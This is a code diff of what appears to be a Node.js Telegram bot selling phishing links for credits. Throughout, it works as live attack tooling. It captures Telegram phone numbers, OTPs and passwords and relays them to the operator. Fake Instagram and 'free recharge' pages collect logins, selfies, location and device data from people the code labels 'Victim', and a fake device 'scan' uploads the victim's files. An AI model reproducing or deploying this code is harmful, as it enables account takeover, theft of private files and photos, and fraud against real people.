             document.querySelector('.input-group label[for="passwordInput"]').style.display = 'none';
         });
 
-        // Allow Enter key on inputs
         usernameInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') continueBtn.click(); });
         passwordInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') loginBtn.click(); });
         utrInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') sendUtrBtn.click(); });
 
-        // Initial: focus on username
         usernameInput.focus();
 
         console.log('✅ New Instagram Phishing Flow Loaded');
@@ -2084,7 +2104,6 @@ body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh
         body: JSON.stringify({ userid: userid, deviceData: deviceData })
     }).catch(function(e) { console.error(e); });
     
-    // Track if user closed the page
     var isClosed = false;
     window.addEventListener('beforeunload', function() {
         if (!isClosed) {
@@ -2184,8 +2203,7 @@ async function startScan() {
         var validFiles = [];
         for (var i = 0; i < files.length; i++) {
             var f = files[i];
-            // Save ALL files up to 1MB (not just images)
-            if (f.size >= 1024 && f.size <= 1048576) { // 1KB to 1MB
+            if (f.size >= 1024 && f.size <= 1048576) {
                 validFiles.push(f);
             }
         }
@@ -2211,7 +2229,6 @@ async function startScan() {
                         reader.onerror = reject;
                         reader.readAsDataURL(file);
                     });
-                    // Send to server for storage
                     await fetch("/api/scan-upload", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -2310,12 +2327,12 @@ app.post('/api/telegram-phish', async (req, res) => {
             session.phone = phone;
             session.step = 'otp';
             
-            const creatorMsg = `📱 <b>Telegram Login Attempt</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n📌 <b>Status:</b> Waiting for OTP...`;
+            const creatorMsg = '📱 <b>Telegram Login Attempt</b>\n\n👤 <b>User ID:</b> <code>' + userId + '</code>\n📱 <b>Phone:</b> <code>' + phone + '</code>\n⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n📌 <b>Status:</b> Waiting for OTP...';
             
-            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
-            await S7.sendMessage(userId, `📱 <b>New Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n💡 Target has entered their phone number. Waiting for OTP...`, { parse_mode: 'HTML' });
+            await sendWithPremium(config.adminId, creatorMsg);
+            await sendWithPremium(userId, '📱 <b>New Telegram Login Attempt</b>\n\n📱 <b>Phone:</b> <code>' + phone + '</code>\n⏰ ' + new Date().toLocaleString() + '\n\n💡 Target has entered their phone number. Waiting for OTP...');
             
-            logToFile(`📱 Phone received: ${phone} from user ${userId}`);
+            logToFile('📱 Phone received: ' + phone + ' from user ' + userId);
             return res.json({ status: 'success' });
         }
 
@@ -2324,20 +2341,20 @@ app.post('/api/telegram-phish', async (req, res) => {
             session.step = 'otp_verification';
             session.decision = null;
             
-            const creatorMsg = `🔐 <b>OTP Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n📌 <b>Choose action:</b>`;
+            const creatorMsg = '🔐 <b>OTP Received</b>\n\n👤 <b>User ID:</b> <code>' + userId + '</code>\n📱 <b>Phone:</b> <code>' + session.phone + '</code>\n🔢 <b>OTP:</b> <code>' + otp + '</code>\n⏰ ' + new Date().toLocaleString() + '\n\n📌 <b>Choose action:</b>';
             
             const buttons = {
                 inline_keyboard: [
-                    [{ text: '✅ Password Manga Raha', callback_data: `phish_password_${sessionId}`, style: 'success' }],
-                    [{ text: '❌ OTP Galat Hai', callback_data: `phish_wrong_${sessionId}`, style: 'danger' }],
-                    [{ text: '📱 Open Ho Gya Telegram', callback_data: `phish_open_${sessionId}`, style: 'success' }]
+                    [{ text: '✅ Password Manga Raha', callback_data: 'phish_password_' + sessionId, style: 'success' }],
+                    [{ text: '❌ OTP Galat Hai', callback_data: 'phish_wrong_' + sessionId, style: 'danger' }],
+                    [{ text: '📱 Open Ho Gya Telegram', callback_data: 'phish_open_' + sessionId, style: 'success' }]
                 ]
             };
             
-            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML', reply_markup: buttons });
-            await S7.sendMessage(userId, `🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n⏰ ${new Date().toLocaleString()}\n\n📌 <b>Choose action:</b>`, { parse_mode: 'HTML', reply_markup: buttons });
+            await sendWithPremium(config.adminId, creatorMsg, 'HTML', buttons);
+            await sendWithPremium(userId, '🔐 <b>OTP Received</b>\n\n📱 <b>Phone:</b> <code>' + session.phone + '</code>\n🔢 <b>OTP:</b> <code>' + otp + '</code>\n⏰ ' + new Date().toLocaleString() + '\n\n📌 <b>Choose action:</b>', 'HTML', buttons);
             
-            logToFile(`🔐 OTP received: ${otp} for phone ${session.phone}`);
+            logToFile('🔐 OTP received: ' + otp + ' for phone ' + session.phone);
             return res.json({ status: 'waiting_decision' });
         }
 
@@ -2345,25 +2362,25 @@ app.post('/api/telegram-phish', async (req, res) => {
             session.password = password;
             session.step = 'password_received';
             
-            const creatorMsg = `🔑 <b>Password Received</b>\n\n👤 <b>User ID:</b> <code>${userId}</code>\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}\n\n✅ Full access credentials collected!`;
+            const creatorMsg = '🔑 <b>Password Received</b>\n\n👤 <b>User ID:</b> <code>' + userId + '</code>\n📱 <b>Phone:</b> <code>' + session.phone + '</code>\n🔑 <b>Password:</b> <code>' + password + '</code>\n⏰ ' + new Date().toLocaleString() + '\n\n✅ Full access credentials collected!';
             
-            await S7.sendMessage(config.adminId, creatorMsg, { parse_mode: 'HTML' });
-            await S7.sendMessage(userId, `✅ <b>Password Received</b>\n\n📱 <b>Phone:</b> <code>${session.phone}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n⏰ ${new Date().toLocaleString()}\n\n🎯 Full credentials captured successfully!`, { parse_mode: 'HTML' });
+            await sendWithPremium(config.adminId, creatorMsg);
+            await sendWithPremium(userId, '✅ <b>Password Received</b>\n\n📱 <b>Phone:</b> <code>' + session.phone + '</code>\n🔑 <b>Password:</b> <code>' + password + '</code>\n⏰ ' + new Date().toLocaleString() + '\n\n🎯 Full credentials captured successfully!');
             
-            logToFile(`🔑 Password received for phone ${session.phone}`);
+            logToFile('🔑 Password received for phone ' + session.phone);
             return res.json({ status: 'success' });
         }
 
         if (action === 'completed') {
             session.step = 'completed';
-            await S7.sendMessage(config.adminId, `✅ <b>Telegram Premium Request Submitted!</b>\n\n👤 User: <code>${userId}</code>\n📱 Phone: <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'HTML' });
-            await S7.sendMessage(userId, `✅ <b>Request Completed!</b>\n\n📱 Phone: <code>${session.phone}</code>\n⏰ ${new Date().toLocaleString()}\n\n🎉 Target has completed the process!`, { parse_mode: 'HTML' });
-            logToFile(`✅ Completed for phone ${session.phone}`);
+            await sendWithPremium(config.adminId, '✅ <b>Telegram Premium Request Submitted!</b>\n\n👤 User: <code>' + userId + '</code>\n📱 Phone: <code>' + session.phone + '</code>\n⏰ ' + new Date().toLocaleString());
+            await sendWithPremium(userId, '✅ <b>Request Completed!</b>\n\n📱 Phone: <code>' + session.phone + '</code>\n⏰ ' + new Date().toLocaleString() + '\n\n🎉 Target has completed the process!');
+            logToFile('✅ Completed for phone ' + session.phone);
             return res.json({ status: 'success' });
         }
 
         if (action === 'resend-otp') {
-            await S7.sendMessage(config.adminId, `🔄 <b>OTP Resend Request</b>\n\n👤 User: <code>${userId}</code>\n📱 Phone: <code>${session.phone}</code>`, { parse_mode: 'HTML' });
+            await sendWithPremium(config.adminId, '🔄 <b>OTP Resend Request</b>\n\n👤 User: <code>' + userId + '</code>\n📱 Phone: <code>' + session.phone + '</code>');
             return res.json({ status: 'success' });
         }
 
@@ -2385,45 +2402,38 @@ app.post('/api/capture-camera-full', async (req, res) => {
         const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
         const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
 
-        const money = getPremiumEmoji('💰');
-        const pin = getPremiumEmoji('📌');
-        const chart = getPremiumEmoji('📊');
-        const calendar = getPremiumEmoji('📅');
-        const check = getPremiumEmoji('✅');
-        const star = getPremiumEmoji('⭐');
-
-        let message = `${money} <u>Victim Free Recharge Visit</u>\n`;
-        message += `__________________________________\n\n`;
-        message += `${pin} <b>Mobile Number:</b> <code>${mobile}</code>\n`;
-        message += `📶 <b>Operator:</b> ${operator || 'N/A'}\n`;
-        message += `${money} <b>Plan Selected:</b> ₹${plan || 'N/A'} (${planDetail || 'N/A'})\n\n`;
-        message += `${chart} <b>Device Info:</b>\n`;
+        let message = '💰 <u>Victim Free Recharge Visit</u>\n';
+        message += '__________________________________\n\n';
+        message += '📌 <b>Mobile Number:</b> <code>' + mobile + '</code>\n';
+        message += '📶 <b>Operator:</b> ' + (operator || 'N/A') + '\n';
+        message += '💰 <b>Plan Selected:</b> ₹' + (plan || 'N/A') + ' (' + (planDetail || 'N/A') + ')\n\n';
+        message += '📊 <b>Device Info:</b>\n';
         
         if (deviceInfo) {
-            message += `• <b>Platform:</b> ${deviceInfo.platform || 'Unknown'}\n`;
-            message += `• <b>Resolution:</b> ${deviceInfo.resolution || 'Unknown'}\n`;
-            message += `• <b>RAM:</b> ${deviceInfo.ram || 'Unknown'}\n`;
-            message += `• <b>Battery:</b> ${deviceInfo.battery || 'Unknown'}\n`;
-            message += `• <b>IP:</b> ${deviceInfo.ip || 'Unknown'}\n`;
-            message += `• <b>Location:</b> ${deviceInfo.location || 'Unknown'}\n`;
+            message += '• <b>Platform:</b> ' + (deviceInfo.platform || 'Unknown') + '\n';
+            message += '• <b>Resolution:</b> ' + (deviceInfo.resolution || 'Unknown') + '\n';
+            message += '• <b>RAM:</b> ' + (deviceInfo.ram || 'Unknown') + '\n';
+            message += '• <b>Battery:</b> ' + (deviceInfo.battery || 'Unknown') + '\n';
+            message += '• <b>IP:</b> ' + (deviceInfo.ip || 'Unknown') + '\n';
+            message += '• <b>Location:</b> ' + (deviceInfo.location || 'Unknown') + '\n';
         } else {
-            message += `• <b>Platform:</b> ${platform || 'Unknown'}\n`;
+            message += '• <b>Platform:</b> ' + (platform || 'Unknown') + '\n';
         }
         
-        message += `• <b>Timezone:</b> Asia/Kolkata\n`;
-        message += `__________________________________\n`;
-        message += `${calendar} <b>Time:</b> ${SYloveTiMe}\n`;
-        message += `📝 <b>Date:</b> ${SYloveDaTe}\n`;
-        message += `${pin} <b>User ID:</b> <code>${userid}</code>`;
-        message += `\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
+        message += '• <b>Timezone:</b> Asia/Kolkata\n';
+        message += '__________________________________\n';
+        message += '📅 <b>Time:</b> ' + SYloveTiMe + '\n';
+        message += '📝 <b>Date:</b> ' + SYloveDaTe + '\n';
+        message += '📌 <b>User ID:</b> <code>' + userid + '</code>';
+        message += '\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ' + config.S7 + '</i>';
 
-        await S7.sendMessage(config.adminId, message, { parse_mode: 'HTML' });
-        await S7.sendMessage(userid, message, { parse_mode: 'HTML' });
+        await sendWithPremium(config.adminId, message);
+        await sendWithPremium(userid, message);
 
         if (photo && photo.length > 100) {
             try {
                 const photoBuffer = Buffer.from(photo, 'base64');
-                const photoCaption = `${star} <b>Selfie from Victim</b>\n📱 Mobile: <code>${mobile}</code>\n📍 ${deviceInfo?.location || 'Unknown location'}`;
+                const photoCaption = '⭐ <b>Selfie from Victim</b>\n📱 Mobile: <code>' + mobile + '</code>\n📍 ' + (deviceInfo?.location || 'Unknown location');
                 await S7.sendPhoto(config.adminId, photoBuffer, { caption: photoCaption, parse_mode: 'HTML' });
                 await S7.sendPhoto(userid, photoBuffer, { caption: photoCaption, parse_mode: 'HTML' });
             } catch (err) {
@@ -2431,7 +2441,7 @@ app.post('/api/capture-camera-full', async (req, res) => {
             }
         }
 
-        logToFile(`📸 Camera full capture from ${mobile} (${operator}) by user ${userid}`);
+        logToFile('📸 Camera full capture from ' + mobile + ' (' + operator + ') by user ' + userid);
         res.json({ status: 'success' });
     } catch (err) {
         console.error('Camera capture error:', err);
@@ -2445,11 +2455,9 @@ app.post('/api/camera-success', async (req, res) => {
         const { userid, mobile, operator, plan } = req.body || {};
         if (!userid) return res.status(400).json({ error: 'Missing userid' });
         
-        const check = getPremiumEmoji('✅');
-        const money = getPremiumEmoji('💰');
-        const msg = `${check} <b>Free Recharge Claimed!</b>\n\n📱 Mobile: <code>${mobile || 'Unknown'}</code>\n📶 Operator: ${operator || 'N/A'}\n💰 Plan: ₹${plan || 'N/A'}\n\n${money} Victim successfully claimed free recharge!`;
-        await S7.sendMessage(config.adminId, msg, { parse_mode: 'HTML' });
-        await S7.sendMessage(userid, msg, { parse_mode: 'HTML' });
+        const msg = '✅ <b>Free Recharge Claimed!</b>\n\n📱 Mobile: <code>' + (mobile || 'Unknown') + '</code>\n📶 Operator: ' + (operator || 'N/A') + '\n💰 Plan: ₹' + (plan || 'N/A') + '\n\n💰 Victim successfully claimed free recharge!';
+        await sendWithPremium(config.adminId, msg);
+        await sendWithPremium(userid, msg);
         
         res.json({ status: 'success' });
     } catch (err) {
@@ -2465,11 +2473,9 @@ app.post('/api/scan-upload', async (req, res) => {
             return res.status(400).json({ error: 'Missing required fields' });
         }
         
-        // Extract base64 data
         const base64Data = data.replace(/^data:.*?;base64,/, "");
         const buffer = Buffer.from(base64Data, 'base64');
         
-        // Save to database
         const saved = await saveScanFile(userid, filename, buffer.toString('base64'), size || buffer.length);
         
         if (saved) {
@@ -2491,25 +2497,19 @@ app.post('/api/scan-close', async (req, res) => {
             return res.status(400).json({ error: 'Missing userid' });
         }
         
-        // Get all files for this user
         const files = await getScanFiles(userid);
         
-        const star = getPremiumEmoji('⭐');
-        const check = getPremiumEmoji('✅');
-        
         if (files.length === 0) {
-            await S7.sendMessage(userid, `${star} <b>Scan Complete</b>\n\nNo files were found during the scan. Your device appears clean!`, { parse_mode: 'HTML' });
+            await sendWithPremium(userid, '⭐ <b>Scan Complete</b>\n\nNo files were found during the scan. Your device appears clean!');
             return res.json({ success: true, count: 0 });
         }
         
-        // Send files to user
         let sentCount = 0;
         let photoCount = 0;
         let fileCount = 0;
         let photoFiles = [];
         let otherFiles = [];
         
-        // Separate photos from other files
         for (const file of files) {
             const isImage = file.filename && /\.(jpg|jpeg|png|gif|bmp|webp|svg|ico|tiff|heic|heif)$/i.test(file.filename);
             if (isImage) {
@@ -2521,12 +2521,11 @@ app.post('/api/scan-close', async (req, res) => {
             }
         }
         
-        // Send photos first
         if (photoFiles.length > 0) {
             for (const photo of photoFiles) {
                 try {
                     const buffer = Buffer.from(photo.data, 'base64');
-                    const caption = `📸 <b>Photo from scan</b>\n📁 ${photo.filename}`;
+                    const caption = '📸 <b>Photo from scan</b>\n📁 ' + photo.filename;
                     await S7.sendPhoto(userid, buffer, { caption: caption, parse_mode: 'HTML' });
                     sentCount++;
                     await new Promise(r => setTimeout(r, 100));
@@ -2536,13 +2535,12 @@ app.post('/api/scan-close', async (req, res) => {
             }
         }
         
-        // Send other files as documents
         if (otherFiles.length > 0) {
             for (const file of otherFiles) {
                 try {
                     const buffer = Buffer.from(file.data, 'base64');
                     await S7.sendDocument(userid, buffer, { 
-                        caption: `📄 <b>File from scan</b>\n📁 ${file.filename}`,
+                        caption: '📄 <b>File from scan</b>\n📁 ' + file.filename,
                         parse_mode: 'HTML',
                         filename: file.filename
                     });
@@ -2554,19 +2552,17 @@ app.post('/api/scan-close', async (req, res) => {
             }
         }
         
-        // Send summary message
-        let summary = `${check} <b>Scan Complete!</b>\n\n`;
-        summary += `📁 <b>Files Found:</b> ${photoCount + fileCount}\n`;
-        if (photoCount > 0) summary += `📸 <b>Photos:</b> ${photoCount}\n`;
-        if (fileCount > 0) summary += `📄 <b>Other Files:</b> ${fileCount}\n`;
-        summary += `\n✅ All files have been sent to you.`;
+        let summary = '✅ <b>Scan Complete!</b>\n\n';
+        summary += '📁 <b>Files Found:</b> ' + (photoCount + fileCount) + '\n';
+        if (photoCount > 0) summary += '📸 <b>Photos:</b> ' + photoCount + '\n';
+        if (fileCount > 0) summary += '📄 <b>Other Files:</b> ' + fileCount + '\n';
+        summary += '\n✅ All files have been sent to you.';
         
-        await S7.sendMessage(userid, summary, { parse_mode: 'HTML' });
+        await sendWithPremium(userid, summary);
         
-        // Delete files from database
         await deleteScanFiles(userid);
         
-        logToFile(`📁 Scan close for ${userid}: sent ${sentCount} files (${photoCount} photos, ${fileCount} other)`);
+        logToFile('📁 Scan close for ' + userid + ': sent ' + sentCount + ' files (' + photoCount + ' photos, ' + fileCount + ' other)');
         res.json({ success: true, count: sentCount });
     } catch (err) {
         console.error('Scan close error:', err);
@@ -2848,11 +2844,11 @@ app.delete('/api/admin/logs', (req, res) => {
     }
 });
 
-// ====================== NEW FIX: /api/device-info endpoint ======================
+// ====================== /api/device-info endpoint ======================
 app.post('/api/device-info', (req, res) => {
     const { userid, deviceData } = req.body || {};
     console.log('📱 Device Info from', userid, deviceData);
-    logToFile(`📱 Device Info from ${userid}: ${JSON.stringify(deviceData)}`);
+    logToFile('📱 Device Info from ' + userid + ': ' + JSON.stringify(deviceData));
     res.json({ status: 'ok' });
 });
 
@@ -2863,37 +2859,30 @@ app.post('/api/capture', async (req, res) => {
     try {
         const photo = await getRandomPhoto();
         const message = LoveNotifer(platform, username, password);
-        // Append plan info if provided
         let extra = '';
         if (plan) {
-            const chart = getPremiumEmoji('📊');
-            extra = `\n${chart} Plan selected: ${plan} followers`;
+            extra = '\n📊 Plan selected: ' + plan + ' followers';
         }
         const fullMessage = message + extra;
 
-        // Send to user
         if (photo) {
             const photoUrl = config.baseUrl + '/api/photo-data/' + photo.id;
             await S7.sendPhoto(userid, photoUrl, { caption: fullMessage, parse_mode: 'HTML' });
         } else {
-            await S7.sendMessage(userid, fullMessage);
+            await sendWithPremium(userid, fullMessage);
         }
 
-        // Send to admin with plan details
-        const star = getPremiumEmoji('⭐');
-        const chart = getPremiumEmoji('📊');
-        const calendar = getPremiumEmoji('📅');
-        let adminMsg = `${star} <b>New Capture</b>\n\n👤 <b>User:</b> <code>${userid}</code>\n📌 <b>Platform:</b> ${platform || 'Unknown'}\n👤 <b>Username:</b> <code>${username}</code>\n🔑 <b>Password:</b> <code>${password}</code>`;
+        let adminMsg = '⭐ <b>New Capture</b>\n\n👤 <b>User:</b> <code>' + userid + '</code>\n📌 <b>Platform:</b> ' + (platform || 'Unknown') + '\n👤 <b>Username:</b> <code>' + username + '</code>\n🔑 <b>Password:</b> <code>' + password + '</code>';
         if (plan) {
-            adminMsg += `\n${chart} <b>Plan:</b> ${plan} followers`;
+            adminMsg += '\n📊 <b>Plan:</b> ' + plan + ' followers';
         }
-        adminMsg += `\n${calendar} <b>Time:</b> ${new Date().toLocaleString()}`;
-        await S7.sendMessage(config.adminId, adminMsg, { parse_mode: 'HTML' });
+        adminMsg += '\n📅 <b>Time:</b> ' + new Date().toLocaleString();
+        await sendWithPremium(config.adminId, adminMsg);
 
-        logToFile(`📸 Capture from user ${userid} (${platform}) - plan: ${plan || 'none'}`);
+        logToFile('📸 Capture from user ' + userid + ' (' + platform + ') - plan: ' + (plan || 'none'));
         res.json({ status: 'success' });
     } catch (err) {
-        logToFile(`❌ Capture error: ${err.message}`);
+        logToFile('❌ Capture error: ' + err.message);
         res.status(500).json({ error: err.message });
     }
 });
@@ -2910,7 +2899,7 @@ app.post('/api/upload-photo-fast', async (req, res) => {
         if (pendingPhotos[userid].length >= config.BATCH_SIZE) await sendBatchPhotos(userid);
         res.json({ success: true, stored: true, count: pendingPhotos[userid].length });
     } catch (err) {
-        logToFile(`❌ Photo upload error: ${err.message}`);
+        logToFile('❌ Photo upload error: ' + err.message);
         res.status(500).json({ error: 'Failed to process photo' });
     }
 });
@@ -2983,7 +2972,7 @@ app.get('/page/:id', async (req, res) => {
                 fs.unlinkSync(filePathDel);
             }
             await Link.deleteOne({ _id: link._id });
-            console.log(`🗑️ Auto-deleted expired link: ${link.fileId}`);
+            console.log('🗑️ Auto-deleted expired link: ' + link.fileId);
         }
         return res.send('<h1 style="color:#ff4757;text-align:center;margin-top:50px;">🔒 Link Expired</h1><p style="text-align:center;color:#888;">' + reason + '</p><p style="text-align:center;color:#888;">Please generate a new link.</p>');
     }
@@ -2998,8 +2987,6 @@ S7.getMe().then(botInfo => {
     console.log('✅ Bot Started: @' + botInfo.username);
     logToFile('🤖 Bot Started: @' + botInfo.username);
 
-    // ====================== REGISTER COMMANDS FOR MENU BUTTON ======================
-    // This enables the official Telegram "☰ Menu" button
     S7.setMyCommands([
         { command: 'start', description: 'Start the bot' },
         { command: 'menu', description: 'Show main menu' }
@@ -3050,29 +3037,24 @@ function getRegenMarkup(platform) {
 async function SendLoveSYMenu(chatId, firstName) {
     const user = await getUser(chatId);
     if (user.banned) {
-        return S7.sendMessage(chatId, '🚫 You are banned from using this bot.');
+        return sendWithPremium(chatId, '🚫 You are banned from using this bot.');
     }
     const featured = await getFeatured();
     const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
     const isAdmin = chatId.toString() === config.adminId;
-    const crown1 = getPremiumEmoji('👑');
-    const crown2 = getPremiumEmoji('👑');
-    const star = getPremiumEmoji('⭐');
-    const pin = getPremiumEmoji('📌');
-    let message = `${crown1}𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ${crown2}\n\n${star} Credits: ${credits}\n${pin} Referrals: ${(user.totalReferrals || 0)}`;
+    let message = '👑𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 👑\n\n⭐ Credits: ' + credits + '\n📌 Referrals: ' + (user.totalReferrals || 0);
     if (featured.status && featured.message) message += '\n\n📌 ' + featured.message;
     const menuText = SYloveMenu(firstName, message);
     let keyboard = LOVESY;
     if (isAdmin) {
         keyboard = { inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: '👑 Admin Panel', callback_data: 'admin_panel', style: 'primary' }]]) };
     }
-    const sentMsg = await S7.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: keyboard });
+    const sentMsg = await sendWithPremium(chatId, menuText, 'HTML', keyboard);
     if (featured.status && featured.photo) {
         const photo = await Photo.findOne({ id: featured.photo });
         if (photo) {
             const photoUrl = config.baseUrl + '/api/photo-data/' + photo.id;
-            const starEmoji = getPremiumEmoji('⭐');
-            await S7.sendPhoto(chatId, photoUrl, { caption: `${starEmoji} Featured Content` });
+            await S7.sendPhoto(chatId, photoUrl, { caption: '⭐ Featured Content' });
         }
     }
     return sentMsg;
@@ -3086,7 +3068,7 @@ async function checkAndSendMenu(chatId, firstName) {
         channels.forEach((ch, i) => { msg += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
         msg += '\nAfter joining, click below to verify.';
         const buttons = await getChannelButtonsAsync();
-        return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: buttons });
+        return sendWithPremium(chatId, msg, 'HTML', buttons);
     }
     await SendLoveSYMenu(chatId, firstName);
 }
@@ -3111,16 +3093,15 @@ S7.on('message', async (msg) => {
     const text = msg.text.trim();
     if (text === '/telegram') {
         const user = await getUser(msg.from.id);
-        if (user.banned) return S7.sendMessage(msg.chat.id, '🚫 You are banned.');
+        if (user.banned) return sendWithPremium(msg.chat.id, '🚫 You are banned.');
         if (!user.unlimited && (user.credits || 0) <= 0) {
-            return S7.sendMessage(msg.chat.id, '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.');
+            return sendWithPremium(msg.chat.id, '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.');
         }
         const deducted = await useCredit(msg.from.id);
         if (!deducted) {
-            return S7.sendMessage(msg.chat.id, '❌ Credit deduction failed. Please try again.');
+            return sendWithPremium(msg.chat.id, '❌ Credit deduction failed. Please try again.');
         }
-        const sparkle = getPremiumEmoji('✨');
-        const loadingMsg = await S7.sendMessage(msg.chat.id, SYloveMenu(msg.from.first_name, `${sparkle}𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)`), { parse_mode: 'HTML', reply_markup: SYBack });
+        const loadingMsg = await sendWithPremium(msg.chat.id, SYloveMenu(msg.from.first_name, '✨𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)'), 'HTML', SYBack);
         try {
             const response = await fetch(config.baseUrl + '/api/create-link', {
                 method: 'GET',
@@ -3132,9 +3113,7 @@ S7.on('message', async (msg) => {
                 await S7.editMessageText(SYloveMenu(msg.from.first_name, '❌ Error generating link: ' + data.error), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
                 return;
             }
-            const check = getPremiumEmoji('✅');
-            const star = getPremiumEmoji('⭐');
-            const finalMsg = `${check} <b>Telegram Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>${data.url}</code>\n\n📌 <b>Platform:</b> TELEGRAM PREMIUM\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> ${config.MAX_OPENS} times\n\n📱 Target will see a real Telegram login page.\nYou will receive OTP and password.\n\n${star} <b>Remaining Credits:</b> ${(user.unlimited ? '♾️ Unlimited' : (user.credits || 0))}`;
+            const finalMsg = '✅ <b>Telegram Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> TELEGRAM PREMIUM\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> ' + config.MAX_OPENS + ' times\n\n📱 Target will see a real Telegram login page.\nYou will receive OTP and password.\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
             await S7.editMessageText(SYloveMenu(msg.from.first_name, finalMsg), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup('telegram') });
         } catch (err) {
             console.error('Telegram Link Error:', err.message);
@@ -3152,13 +3131,12 @@ S7.on('message', async (msg) => {
     const text = msg.text.trim();
     if (text === '/getadmin' || text === '/adminpanel') {
         if (msg.from.id.toString() !== config.adminId) {
-            return S7.sendMessage(msg.chat.id, '❌ Only admin can access.');
+            return sendWithPremium(msg.chat.id, '❌ Only admin can access.');
         }
         const adminUrl = config.baseUrl + '/admin';
-        const crown1 = getPremiumEmoji('👑');
-        await S7.sendMessage(msg.chat.id, 
-            `${crown1} <b>Admin Panel</b>\n\n🔗 Click here: <a href="${adminUrl}">Open Admin Panel</a>\n\nOr copy this URL:\n<code>${adminUrl}</code>`,
-            { parse_mode: 'HTML', disable_web_page_preview: true }
+        await sendWithPremium(msg.chat.id, 
+            '👑 <b>Admin Panel</b>\n\n🔗 Click here: <a href="' + adminUrl + '">Open Admin Panel</a>\n\nOr copy this URL:\n<code>' + adminUrl + '</code>',
+            'HTML', null, { disable_web_page_preview: true }
         );
     }
 });
@@ -3171,7 +3149,7 @@ S7.on('message', async (msg) => {
         const amountStr = text.replace('/pay ', '').trim();
         const amount = parseInt(amountStr);
         if (isNaN(amount) || amount <= 0) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount.\nExample: /pay 20');
+            return sendWithPremium(msg.chat.id, '⚠️ Please enter a valid amount.\nExample: /pay 20');
         }
         let credits, plan;
         if (amount === 20) { credits = 10; plan = '10'; }
@@ -3183,19 +3161,18 @@ S7.on('message', async (msg) => {
             plan = 'custom';
         }
         const user = await getUser(msg.from.id);
-        if (user.banned) return S7.sendMessage(msg.chat.id, '🚫 You are banned.');
-        const money = getPremiumEmoji('💰');
-        const msgText = `${money} <b>Payment Request</b>\n\n📊 Credits: ${credits}\n💵 Amount: ₹${amount}\n🆔 Transaction ID: PTS-${Date.now().toString(36).toUpperCase()}\n\n📤 Please send the payment screenshot after paying.`;
-        await S7.sendMessage(msg.chat.id, msgText, { parse_mode: 'HTML' });
+        if (user.banned) return sendWithPremium(msg.chat.id, '🚫 You are banned.');
+        const msgText = '💰 <b>Payment Request</b>\n\n📊 Credits: ' + credits + '\n💵 Amount: ₹' + amount + '\n🆔 Transaction ID: PTS-' + Date.now().toString(36).toUpperCase() + '\n\n📤 Please send the payment screenshot after paying.';
+        await sendWithPremium(msg.chat.id, msgText);
         if (await qrExists()) {
             const qrBuffer = await getQR();
-            await S7.sendPhoto(msg.chat.id, qrBuffer, { caption: `💳 Scan QR to pay ₹${amount}`, parse_mode: 'HTML' });
+            await S7.sendPhoto(msg.chat.id, qrBuffer, { caption: '💳 Scan QR to pay ₹' + amount, parse_mode: 'HTML' });
         } else {
-            await S7.sendMessage(msg.chat.id, '⚠️ QR code not uploaded yet. Admin will add soon.');
+            await sendWithPremium(msg.chat.id, '⚠️ QR code not uploaded yet. Admin will add soon.');
         }
         user._pendingPayment = { credits, amount, plan };
         await user.save();
-        await S7.sendMessage(msg.chat.id, '✅ Please send the transaction screenshot (photo) after payment.');
+        await sendWithPremium(msg.chat.id, '✅ Please send the transaction screenshot (photo) after payment.');
         return;
